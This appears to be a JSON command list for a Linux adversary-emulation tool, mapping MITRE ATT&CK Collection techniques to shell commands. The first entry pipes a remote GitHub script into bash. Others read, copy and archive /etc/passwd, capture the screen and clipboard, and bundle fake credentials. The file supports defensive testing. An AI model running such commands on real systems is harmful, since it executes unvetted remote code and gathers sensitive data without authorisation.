{
  "commands": [
    {
      "tactic_id": "T1074.001",
      "technique": "Data Staged - Local Data Staging",
      "command": "curl -s \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh\" | bash -s > \"Output/Collection/T1074.001_Collection.txt\" && curl ifconfig.me"
    },
    {
      "tactic_id": "T1113-1",
      "technique": "Screen Capture",
      "command": "mkdir -p Output/Collection/T1113_Collection_screenshots && xwd -root -out Output/Collection/T1113_Collection_screenshots/T1113_desktop.xwd"
    },
    {
      "tactic_id": "T1113-2",
      "technique": "Screen Capture",
      "command": "xwud -in Output/Collection/T1113_Collection_screenshots/T1113_desktop.xwd"
    },
    {
      "tactic_id": "T1113-3",
      "technique": "Screen Capture",
      "command": "import -window root Output/Collection/T1113_Collection_screenshots/T1113_desktop.png"
    },
    {
      "tactic_id": "T1560.002-1",
      "technique": "Archive Collected Data - Archive via Library",
      "command": "echo -e 'import gzip\\ninput_file = open(\"/etc/passwd\", \"rb\")\\ncontent = input_file.read()\\ninput_file.close()\\noutput_file = gzip.GzipFile(\"/tmp/passwd.gz\", \"wb\", compresslevel=6)\\noutput_file.write(content)\\noutput_file.close()' > /tmp/sisa_test1.py && python3 /tmp/sisa_test1.py && rm /tmp/passwd.gz /tmp/sisa_test1.py"
    },
    {
      "tactic_id": "T1560.002-2",
      "technique": "Archive Collected Data - Archive via Library",
      "command": "echo -e 'import bz2\\ninput_file = open(\"/etc/passwd\", \"rb\")\\ncontent = input_file.read()\\ninput_file.close()\\nbz2content = bz2.compress(content, compresslevel=9)\\noutput_file = open(\"/tmp/passwd.bz2\", \"wb\")\\noutput_file.write(bz2content)\\noutput_file.close()' > /tmp/sisa_test2.py && python3 /tmp/sisa_test2.py && rm /tmp/passwd.bz2 /tmp/sisa_test2.py"
    },
    {
      "tactic_id": "T1560.002-3",
      "technique": "Archive Collected Data - Archive via Library",
      "command": "echo -e 'from zipfile import ZipFile\\nzipf = ZipFile(\"/tmp/passwd.zip\", \"w\")\\ntry:\\n    zipf.write(\"/etc/passwd\")\\nfinally:\\n    zipf.close()' > /tmp/sisa_test3.py && python3 /tmp/sisa_test3.py && rm /tmp/passwd.zip /tmp/sisa_test3.py"
    },
    {
      "tactic_id": "T1560.002-4",
      "technique": "Archive Collected Data - Archive via Library",
      "command": "echo -e 'import tarfile\\ntar = tarfile.open(\"/tmp/passwd.tar.gz\", \"w:gz\")\\ntry:\\n    tar.add(\"/etc/passwd\")\\nfinally:\\n    tar.close()' > /tmp/sisa_test4.py && python3 /tmp/sisa_test4.py && rm /tmp/passwd.tar.gz /tmp/sisa_test4.py"
    },
    {
      "tactic_id": "T1005",
      "technique": "Collection - Data from Local System - Simulate file viewing with multiple utilities",
      "command": "cat /etc/passwd; head -n 3 /etc/passwd; tail -n 5 /etc/passwd"
    },
    {
      "tactic_id": "T1074.001",
      "technique": "Collection - Local Data Staging - Simulate staging and previewing sensitive file",
      "command": "cp /etc/passwd /tmp/passwd_copy && head -n 3 /tmp/passwd_copy && rm -f /tmp/passwd_copy"
    },
    {
      "tactic_id": "T1560.001-1",
      "technique": "Collection - Archive Collected Data: Archive via Utility",
      "command": "mkdir -p /tmp/exfil_sim/fake_data && echo 'Internal credentials: admin:admin123' > /tmp/exfil_sim/fake_data/creds.txt && echo 'Private SSH Key ---BEGIN--- ...' > /tmp/exfil_sim/fake_data/id_rsa && echo 'Financial Report: Q1 2025 (confidential)' > /tmp/exfil_sim/fake_data/finance.csv && tar -cf /tmp/exfil_sim/data_bundle.tar -C /tmp/exfil_sim/fake_data . && gzip -f /tmp/exfil_sim/data_bundle.tar && rm -rf /tmp/exfil_sim"
    },
    {
      "tactic_id": "T1560.001-2",
      "technique": "Collection - Archive Collected Data: Archive via Utility (gzip)",
      "command": "mkdir -p /tmp/gzip_demo && echo 'This is a demo file for gzip compression simulation.' > /tmp/gzip_demo/sample_data.txt && gzip -k /tmp/gzip_demo/sample_data.txt && sleep 3 && rm -f /tmp/gzip_demo/sample_data.txt /tmp/gzip_demo/sample_data.txt.gz && rmdir /tmp/gzip_demo 2>/dev/null"
    },
    {
      "tactic_id": "T1115",
      "technique": "Collection - Clipboard Data",
      "command": "command -v xclip >/dev/null && echo 'simulation of xclip clipboard usage.' > /tmp/xclip_simulation.txt && xclip -selection clipboard /tmp/xclip_simulation.txt && xclip -selection clipboard -o > /tmp/xclip_clipboard_log.txt && cat /tmp/xclip_clipboard_log.txt && rm -f /tmp/xclip_simulation.txt /tmp/xclip_clipboard_log.txt"
    }
  ]
}

